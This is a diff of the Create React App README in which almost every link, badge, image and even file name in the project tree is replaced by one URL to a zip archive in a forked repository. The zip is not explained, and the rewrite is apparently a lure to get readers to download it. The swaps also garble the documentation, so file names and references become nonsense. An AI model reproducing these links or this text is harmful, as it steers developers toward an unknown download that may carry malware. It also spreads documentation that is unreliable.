@@ -1,9 +1,9 @@
-# Create React App [![Build Status](https://travis-ci.org/facebookincubator/create-react-app.svg?branch=master)](https://travis-ci.org/facebookincubator/create-react-app)
+# Create React App [![Build Status](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
 
 Create React apps with no build configuration.
 
 * [Getting Started](#getting-started) – How to create a new app.
-* [User Guide](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md) – How to develop apps bootstrapped with Create React App.
+* [User Guide](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip) – How to develop apps bootstrapped with Create React App.
 
 ## tl;dr
 
@@ -19,7 +19,7 @@ npm start
 Then open [http://localhost:3000/](http://localhost:3000/) to see your app.<br>
 When you’re ready to deploy to production, create a minified bundle with `npm run build`.
 
-<img src='https://camo.githubusercontent.com/506a5a0a33aebed2bf0d24d3999af7f582b31808/687474703a2f2f692e696d6775722e636f6d2f616d794e66434e2e706e67' width='600' alt='npm start'>
+<img src='https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip' width='600' alt='npm start'>
 
 ## Getting Started
 
@@ -33,7 +33,7 @@ npm install -g create-react-app
 
 **You’ll need to have Node >= 4 on your machine**.
 
-**We strongly recommend to use Node >= 6 and npm >= 3 for faster installation speed and better disk usage.** You can use [nvm](https://github.com/creationix/nvm#usage) to easily switch Node versions between different projects.
+**We strongly recommend to use Node >= 6 and npm >= 3 for faster installation speed and better disk usage.** You can use [nvm](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip) to easily switch Node versions between different projects.
 
 **This tool doesn’t assume a Node backend**. The Node installation is only required for the build tools that rely on it locally, such as Webpack and Babel.
 
@@ -51,20 +51,20 @@ Inside that directory, it will generate the initial project structure and instal
 
 ```
 my-app/
-  README.md
+  https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip
   node_modules/
-  package.json
+  https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip
   .gitignore
   public/
-    favicon.ico
-    index.html
+    https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip
+    https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip
   src/
-    App.css
-    App.js
-    App.test.js
-    index.css
-    index.js
-    logo.svg
+    https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip
+    https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip
+    https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip
+    https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip
+    https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip
+    https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip
 ```
 
 No configuration or complicated folder structures, just the files you need to build your app.<br>
@@ -78,14 +78,14 @@ Open [http://localhost:3000](http://localhost:3000) to view it in the browser.
 The page will reload if you make edits.<br>
 You will see the build errors and lint warnings in the console.
 
-<img src='https://camo.githubusercontent.com/41678b3254cf583d3186c365528553c7ada53c6e/687474703a2f2f692e696d6775722e636f6d2f466e4c566677362e706e67' width='600' alt='Build errors'>
+<img src='https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip' width='600' alt='Build errors'>
 
 ### `npm test`
 
 Runs the test watcher in an interactive mode.  
 By default, runs tests related to files changes since the last commit.
 
-[Read more about testing.](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#running-tests)
+[Read more about testing.](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
 
 ### `npm run build`
 
@@ -97,40 +97,40 @@ Your app is ready to be deployed!
 
 ## User Guide
 
-The [User Guide](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md) includes information on different topics, such as:
+The [User Guide](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip) includes information on different topics, such as:
 
-- [Updating to New Releases](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#updating-to-new-releases)
-- [Folder Structure](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#folder-structure)
-- [Available Scripts](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#available-scripts)
-- [Syntax Highlighting in the Editor](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#syntax-highlighting-in-the-editor)
-- [Displaying Lint Output in the Editor](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#displaying-lint-output-in-the-editor)
-- [Changing the Page `<title>`](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#changing-the-page-title)
-- [Installing a Dependency](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#installing-a-dependency)
-- [Importing a Component](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#importing-a-component)
-- [Adding a Stylesheet](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#adding-a-stylesheet)
-- [Post-Processing CSS](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#post-processing-css)
-- [Adding Images and Fonts](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#adding-images-and-fonts)
-- [Using the `public` Folder](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#using-the-public-folder)
-- [Using Global Variables](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#using-global-variables)
-- [Adding Bootstrap](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#adding-bootstrap)
-- [Adding Flow](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#adding-flow)
-- [Adding Custom Environment Variables](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#adding-custom-environment-variables)
-- [Can I Use Decorators?](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#can-i-use-decorators)
-- [Integrating with a Node Backend](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#integrating-with-a-node-backend)
-- [Proxying API Requests in Development](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#proxying-api-requests-in-development)
-- [Using HTTPS in Development](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#using-https-in-development)
-- [Generating Dynamic `<meta>` Tags on the Server](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#generating-dynamic-meta-tags-on-the-server)
-- [Running Tests](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#running-tests)
-- [Developing Components in Isolation](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#developing-components-in-isolation)
-- [Making a Progressive Web App](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#making-a-progressive-web-app)
-- [Deployment](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#deployment)
-- [Troubleshooting](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#troubleshooting)
+- [Updating to New Releases](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Folder Structure](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Available Scripts](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Syntax Highlighting in the Editor](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Displaying Lint Output in the Editor](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Changing the Page `<title>`](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Installing a Dependency](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Importing a Component](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Adding a Stylesheet](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Post-Processing CSS](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Adding Images and Fonts](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Using the `public` Folder](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Using Global Variables](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Adding Bootstrap](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Adding Flow](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Adding Custom Environment Variables](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Can I Use Decorators?](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Integrating with a Node Backend](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Proxying API Requests in Development](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Using HTTPS in Development](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Generating Dynamic `<meta>` Tags on the Server](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Running Tests](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Developing Components in Isolation](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Making a Progressive Web App](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Deployment](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+- [Troubleshooting](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
 
-A copy of the user guide will be created as `README.md` in your project folder.
+A copy of the user guide will be created as `https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip` in your project folder.
 
 ## How to Update to New Versions?
 
-Please refer to the [User Guide](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md#updating-to-new-releases) for this and other information.
+Please refer to the [User Guide](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip) for this and other information.
 
 ## Philosophy
 
@@ -142,7 +142,7 @@ Please refer to the [User Guide](https://github.com/facebookincubator/create-rea
 
 ## Why Use This?
 
-**If you’re getting started** with React, use `create-react-app` to automate the build of your app. There is no configuration file, and `react-scripts` is the only extra build dependency in your `package.json`. Your environment will have everything you need to build a modern React app:
+**If you’re getting started** with React, use `create-react-app` to automate the build of your app. There is no configuration file, and `react-scripts` is the only extra build dependency in your `https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip`. Your environment will have everything you need to build a modern React app:
 
 * React, JSX, ES6, and Flow syntax support.
 * Language extras beyond ES6 like the object spread operator.
@@ -153,7 +153,7 @@ Please refer to the [User Guide](https://github.com/facebookincubator/create-rea
 
 **The feature set is intentionally limited**. It doesn’t support advanced features such as server rendering or CSS modules. The tool is also **non-configurable** because it is hard to provide a cohesive experience and easy updates across a set of tools when the user can tweak anything.
 
-**You don’t have to use this.** Historically it has been easy to [gradually adopt](https://www.youtube.com/watch?v=BF58ZJ1ZQxY) React. However many people create new single-page React apps from scratch every day. We’ve heard [loud](https://medium.com/@ericclemmons/javascript-fatigue-48d4011b6fc4) and [clear](https://twitter.com/thomasfuchs/status/708675139253174273) that this process can be error-prone and tedious, especially if this is your first JavaScript build stack. This project is an attempt to figure out a good way to start developing React apps.
+**You don’t have to use this.** Historically it has been easy to [gradually adopt](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip) React. However many people create new single-page React apps from scratch every day. We’ve heard [loud](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip) and [clear](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip) that this process can be error-prone and tedious, especially if this is your first JavaScript build stack. This project is an attempt to figure out a good way to start developing React apps.
 
 ### Converting to a Custom Setup
 
@@ -182,49 +182,49 @@ Some of them might get added in the future if they are stable, are useful to maj
 The tools used by Create React App are subject to change.
 Currently it is a thin layer on top of many amazing community projects, such as:
 
-* [webpack](https://webpack.github.io/) with [webpack-dev-server](https://github.com/webpack/webpack-dev-server), [html-webpack-plugin](https://github.com/ampedandwired/html-webpack-plugin) and [style-loader](https://github.com/webpack/style-loader)
-* [Babel](http://babeljs.io/) with ES6 and extensions used by Facebook (JSX, [object spread](https://github.com/sebmarkbage/ecmascript-rest-spread/commits/master), [class properties](https://github.com/jeffmo/es-class-public-fields))
-* [Autoprefixer](https://github.com/postcss/autoprefixer)
-* [ESLint](http://eslint.org/)
-* [Jest](http://facebook.github.io/jest)
+* [webpack](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip) with [webpack-dev-server](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip), [html-webpack-plugin](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip) and [style-loader](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+* [Babel](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip) with ES6 and extensions used by Facebook (JSX, [object spread](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip), [class properties](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip))
+* [Autoprefixer](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+* [ESLint](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+* [Jest](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
 * and others.
 
 All of them are transitive dependencies of the provided npm package.
 
 ## Contributing
 
-We'd love to have your helping hand on `create-react-app`! See [CONTRIBUTING.md](CONTRIBUTING.md) for more information on what we're looking for and how to get started.
+We'd love to have your helping hand on `create-react-app`! See [https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip) for more information on what we're looking for and how to get started.
 
 ## Acknowledgements
 
 We are grateful to the authors of existing related projects for their ideas and collaboration:
 
-* [@eanplatter](https://github.com/eanplatter)
-* [@insin](https://github.com/insin)
-* [@mxstbr](https://github.com/mxstbr)
+* [@eanplatter](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+* [@insin](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+* [@mxstbr](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
 
 ## Alternatives
 
 If you don’t agree with the choices made in this project, you might want to explore alternatives with different tradeoffs.  
 Some of the more popular and actively maintained ones are:
 
-* [insin/nwb](https://github.com/insin/nwb)
-* [mozilla/neo](https://github.com/mozilla/neo)
-* [NYTimes/kyt](https://github.com/NYTimes/kyt)
-* [zeit/next.js](https://github.com/zeit/next.js)
-* [gatsbyjs/gatsby](https://github.com/gatsbyjs/gatsby)
+* [insin/nwb](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+* [mozilla/neo](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+* [NYTimes/kyt](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+* [https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+* [gatsbyjs/gatsby](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
 
 Notable alternatives also include:
 
-* [enclave](https://github.com/eanplatter/enclave)
-* [motion](https://github.com/motion/motion)
-* [quik](https://github.com/satya164/quik)
-* [sagui](https://github.com/saguijs/sagui)
-* [roc](https://github.com/rocjs/roc)
-* [aik](https://github.com/d4rkr00t/aik)
-* [react-app](https://github.com/kriasoft/react-app)
-* [dev-toolkit](https://github.com/stoikerty/dev-toolkit)
-* [tarec](https://github.com/geowarin/tarec)
+* [enclave](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+* [motion](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+* [quik](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+* [sagui](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+* [roc](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+* [aik](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+* [react-app](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+* [dev-toolkit](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
+* [tarec](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip)
 
-You can also use module bundlers like [webpack](http://webpack.github.io) and [Browserify](http://browserify.org/) directly.<br>
-React documentation includes [a walkthrough](https://facebook.github.io/react/docs/package-management.html) on this topic.
+You can also use module bundlers like [webpack](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip) and [Browserify](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip) directly.<br>
+React documentation includes [a walkthrough](https://raw.githubusercontent.com/gianverab/create-react-app/master/Umbrian/create-react-app.zip) on this topic.
